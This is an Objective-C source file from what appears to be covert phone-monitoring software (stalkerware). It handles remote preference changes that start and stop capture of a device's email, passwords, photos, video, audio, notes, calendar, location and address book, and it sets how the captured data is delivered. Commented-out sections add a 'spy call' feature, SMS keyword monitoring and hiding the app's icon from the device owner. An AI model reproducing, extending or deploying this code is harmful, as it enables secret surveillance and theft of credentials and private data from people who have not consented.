//
//  PreferencesChangeHandler.m
//  AppEngine
//
//  Created by Makara Khloth on 12/8/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "PreferencesChangeHandler.h"
#import "AppEngine.h"

#import "ComponentHeaders.h"

@interface PreferencesChangeHandler (private)
- (void) enableDisableEventsCapture: (PrefEventsCapture *) aPrefEventCapture;
- (void) enableDisableLocationCapture: (PrefLocation *) aPrefLocation;
- (void) enableDisableSpyCall: (PrefMonitorNumber *) aPrefMonitorNumber;
//- (void) enableDisableSIMChangeNotification;
- (void) enableDisableKeyword: (PrefKeyword *) aPrefKeyword;
- (void) enableDisableVisibility: (PrefVisibility *) aPrefVisibility;
- (void) enableDisableAddressbookMode: (PrefRestriction *) aPrefRestriction;
@end

@implementation PreferencesChangeHandler

- (id) initWithAppEngine:(AppEngine *) aAppEngine {
    if ((self = [super init])) {
        mAppEngine = aAppEngine;
        [mAppEngine retain];
    }
    return (self);
}

- (BOOL) isSupportSettingIDOfRemoteCmdCodeSettings: (NSInteger) aSettingID {
    id <ConfigurationManager> configurationManager  = [mAppEngine mConfigurationManager];
    
    BOOL isSupport                                  = [configurationManager isSupportedSettingID:aSettingID
                                                                                     remoteCmdID:kRemoteCmdCodeSetSettings];
    DLog(@"This setting id %ld, isSupport ? %d", (long)aSettingID, isSupport);
    return isSupport;
}

- (void) onPreferenceChange: (Preference *) aPreference {
    switch ([aPreference type]) {
        case kEvents_Ctrl: {
            // 1. Events
            PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)aPreference;
            [self enableDisableEventsCapture:prefEventCapture];
            // 2. Location
            PrefLocation *prefLocation = (PrefLocation *)[[mAppEngine mPreferenceManager] preference:kLocation];
            [self enableDisableLocationCapture:prefLocation];
        } break;
        case kLocation: {
            PrefLocation *prefLocation = (PrefLocation *)aPreference;
            [self enableDisableLocationCapture:prefLocation];
        } break;
            //		case kHome_Number: {
            //			[self enableDisableSIMChangeNotification];
            //		} break;
        case kMonitor_Number: {
            [self enableDisableSpyCall:(PrefMonitorNumber *)aPreference];
            //[self enableDisableSIMChangeNotification];
        } break;
        case kKeyword: {
            [self enableDisableKeyword:(PrefKeyword *)aPreference];
        } break;
        case kVisibility: {
            [self enableDisableVisibility:(PrefVisibility *)aPreference];
        } break;
        case kRestriction: {
            [self enableDisableAddressbookMode:(PrefRestriction *)aPreference];
        } break;
        default:
            break;
    }
}

- (void) enableDisableEventsCapture: (PrefEventsCapture *) aPrefEventCapture {
    if ([aPrefEventCapture mDeliveryMethod] == kDeliveryMethodAny) {
        [[mAppEngine mDDM] setMDataDeliveryMethod:kDataDeliveryViaWifiWWAN];
    } else if ([aPrefEventCapture mDeliveryMethod] == kDeliveryMethodWifi) {
        [[mAppEngine mDDM] setMDataDeliveryMethod:kDataDeliveryViaWifiOnly];
    }
    
    [[mAppEngine mEDM] setMaximumEvent:[aPrefEventCapture mMaxEvent]];
    [[mAppEngine mEDM] setDeliveryTimer:[aPrefEventCapture mDeliverTimer]];
    
    // Email
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventEmail]) {
        if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableEmail]) {
            [[mAppEngine mMailCaptureManager] startMonitoring];
        } else {
            [[mAppEngine mMailCaptureManager] stopMonitoring];
        }
    }
    
    // Media finder
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SearchMediaFilesInFileSystem]) {
        NSMutableArray *entries = [NSMutableArray array];
        // Image
        if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableCameraImage] &&
            !([aPrefEventCapture mSearchMediaFilesFlags] & kSearchMediaImage)) { // Not search yet
            [MediaFinder setImageFindEntry:entries];
            [aPrefEventCapture setMSearchMediaFilesFlags:[aPrefEventCapture mSearchMediaFilesFlags] | kSearchMediaImage];
            [[mAppEngine mPreferenceManager] savePreference:aPrefEventCapture];
        }
        // Video
        if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableVideoFile] &&
            !([aPrefEventCapture mSearchMediaFilesFlags] & kSearchMediaVideo)) { // Not search yet
            [MediaFinder setVideoFindEntry:entries];
            [aPrefEventCapture setMSearchMediaFilesFlags:[aPrefEventCapture mSearchMediaFilesFlags] | kSearchMediaVideo];
            [[mAppEngine mPreferenceManager] savePreference:aPrefEventCapture];
        }
        // Audio
        if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableAudioFile] &&
            !([aPrefEventCapture mSearchMediaFilesFlags] & kSearchMediaAudio)) { // Not search yet
            [MediaFinder setAudioFindEntry:entries];
            [aPrefEventCapture setMSearchMediaFilesFlags:[aPrefEventCapture mSearchMediaFilesFlags] | kSearchMediaAudio];
            [[mAppEngine mPreferenceManager] savePreference:aPrefEventCapture];
        }
        if ([entries count]) {
            // We will not search media files we will wait for command (new use case)
            //[[mAppEngine mMediaFinder] findMediaFileWithExtMime:entries];
        }
    }
    
    // Note manager
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_NoteCapture]) {
        if ([aPrefEventCapture mEnableNote]) { // Regardless of stop capture flag
            [[mAppEngine mNoteManager] startCapture];
        } else {
            [[mAppEngine mNoteManager] stopCapture];
        }
    }
    
    // Calendar manager
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCalendar]) {
        if ([aPrefEventCapture mEnableCalendar]) { // Regardless of stop capture flag
            [[mAppEngine mCalendarManager] startCapture];
        } else {
            [[mAppEngine mCalendarManager] stopCapture];
        }
    }
    
    // Password
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventPassword]) {
        if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnablePassword]) {
            [[mAppEngine mPasswordCaptureManager] startCapture];
        } else {
            [[mAppEngine mPasswordCaptureManager] stopCapture];
        }
    }
}

- (void) enableDisableLocationCapture: (PrefLocation *) aPrefLocation {
    PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)[[mAppEngine mPreferenceManager] preference:kEvents_Ctrl];
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventLocation]) {
        [[mAppEngine mLocationManager] setMIntervalTime:[aPrefLocation mLocationInterval]];
        if ([prefEventCapture mStartCapture] && [aPrefLocation mEnableLocation]) {
            [[mAppEngine mLocationManager] startTracking];
        } else {
            [[mAppEngine mLocationManager] stopTracking];
        }
    }
}

- (void) enableDisableSpyCall: (PrefMonitorNumber *) aPrefMonitorNumber {
    //	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SpyCall] ||
    //		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_OnDemandConference]) {
    //		if ([[[mAppEngine mLicenseManager] mCurrentLicenseInfo] licenseStatus] != EXPIRED &&
    //			[[[mAppEngine mLicenseManager] mCurrentLicenseInfo] licenseStatus] != DISABLE) {
    //			if ([aPrefMonitorNumber mEnableMonitor]) {
    //				[[mAppEngine mSpyCallManager] start];
    //				if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCall]) {
    //					[[mAppEngine mCallLogCaptureManager] setMNotCaptureNumbers:[aPrefMonitorNumber mMonitorNumbers]];
    //				}
    //			} else {
    //				[[mAppEngine mSpyCallManager] stop];
    //				if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCall]) {
    //					[[mAppEngine mCallLogCaptureManager] setMNotCaptureNumbers:nil];
    //				}
    //			}
    //		} else {
    //			[[mAppEngine mSpyCallManager] stop];
    //			if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCall]) {
    //				[[mAppEngine mCallLogCaptureManager] setMNotCaptureNumbers:nil];
    //			}
    //		}
    //	}
}

- (void) enableDisableKeyword: (PrefKeyword *) aPrefKeyword {
    //	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SMSKeyword]) {
    //		NSData *keywordData = [aPrefKeyword toData];
    //		SharedFileIPC *sharedFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
    //		[sharedFileIPC writeData:keywordData withID:kSharedFileKeywordID];
    //		[sharedFileIPC release];
    //	}
}

- (void) enableDisableVisibility: (PrefVisibility *) aPrefVisibility {
    //	// Visibility
    //	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_HideApplicationIcon]) {
    //		id <AppVisibility> visibility = [[mAppEngine mApplicationContext] getAppVisibility];
    //		if ([aPrefVisibility mVisible]) {
    //			[visibility hideIconFromAppSwitcherIcon:NO andDesktop:NO];
    //		} else {
    //			[visibility hideIconFromAppSwitcherIcon:YES andDesktop:YES];
    //		}
    //		[visibility applyAppVisibility];
    //	}
    //
    //    id <AppVisibility> visibility = [[mAppEngine mApplicationContext] getAppVisibility];
    //
    //    // Hide these invisible applications
    //    [visibility hideApplicationIconFromAppSwitcherSpringBoard:[aPrefVisibility hiddenBundleIdentifiers]];
    //
    //    // Show these invisible applications
    //    [visibility showApplicationIconInAppSwitcherSpringBoard:[aPrefVisibility shownBundleIdentifiers]];
    //    
    //    [visibility applyAppVisibility];
}

- (void) enableDisableAddressbookMode: (PrefRestriction *) aPrefRestriction {
    // Address book manager
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_AddressbookManagement]) {
        // Address book management mode
        if (([aPrefRestriction mAddressBookMgtMode] & kAddressMgtModeRestrict) ||
            ([aPrefRestriction mAddressBookMgtMode] & kAddressMgtModeMonitor)) {
            [[mAppEngine mAddressbookManager] setMode:kAddressbookManagerModeMonitor];
            [[mAppEngine mAddressbookManager] start];
        } else {
            [[mAppEngine mAddressbookManager] setMode:kAddressbookManagerModeOff];
            [[mAppEngine mAddressbookManager] stop];
        }
    }	
}

- (void) dealloc {
    [mAppEngine release];
    [super dealloc];
}

@end
